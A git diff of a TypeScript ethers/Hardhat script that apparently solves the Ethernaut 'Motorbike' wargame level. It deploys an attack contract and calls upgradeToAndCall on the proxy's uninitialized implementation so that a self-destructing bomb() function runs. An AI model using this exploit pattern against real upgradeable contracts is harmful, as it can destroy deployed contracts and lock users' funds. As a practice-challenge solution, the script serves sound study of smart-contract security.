@@ -6,6 +6,9 @@ const attackMotorbike = async () => {
     const motorbikeAddress = "0xC4BB01C7AA492bdFF60f6989542d71DB7cb73Fd1"; //type "await contract.address()" in ethernaut console
     const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
     const bombAddress = "0xF00f8E16b9c6588997a8bdE69e2749a52957d752";
+    const args: any[] = [];
+    const deployer = process.env.PRIVATE_KEY || "";
+    // [deployer] = await ethers.getSigners();
 
     // Don't touch below
     // Engine contract is vulnerable since you can find the address of the logic implementation.
@@ -17,6 +20,34 @@ const attackMotorbike = async () => {
     // https://docs.openzeppelin.com/contracts/4.x/api/proxy
     // https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol
     // Get _IMPLEMENTATION_SLOT of Motorbike
+
+    // deploying attack contract here
+    // const deployed = await deployContract(hre, "AttackMotorbikeEngine", args);
+    // alternative below
+    console.log("Deploying attack contract AttackMotorbikeEngine...");
+    const Factory = await ethers.getContractFactory("AttackMotorbikeEngine", deployer);
+    const attackMotorbikeEngine = await Factory.deploy();
+    console.log(attackMotorbikeEngine);
+    console.log(`Contract deployed to ${attackMotorbikeEngine.address}`);
+    console.log("Attack contract deployed...");
+    // experimantal verify below
+    // if (attackMotorbikeEngine.address){
+    //     console.log("Verifying contract...");
+    //     try {
+    //         await run("verify:verify", {
+    //             address: attackMotorbikeEngine.address,
+    //             constructorArguments: args,
+    //         });
+    //     } catch (e: any) {
+    //         if (e.message.toLowerCase().includes("already verified")) {
+    //             console.log("Already verified!");
+    //         } else {
+    //             console.log(e);
+    //         }
+    //     }
+    // }
+
+    // atacking here
     console.log("Reading _IMPLEMENTATION_SLOT of Motorbike");
     const implAddress = await ethers.provider.getStorageAt(
         motorbikeAddress,
@@ -49,7 +80,7 @@ const attackMotorbike = async () => {
     const funcSignBomb = ["function bomb() public"];
     const ifaceBomb = new ethers.utils.Interface(funcSignBomb);
     const bombDAta = ifaceBomb.encodeFunctionData("bomb()");
-    const upgradeParams = [bombAddress, bombDAta];
+    const upgradeParams = [attackMotorbikeEngine.address, bombDAta];
     const funcSignUpgrade = [
         "function upgradeToAndCall(address newImplementation, bytes memory data) external payable",
     ];
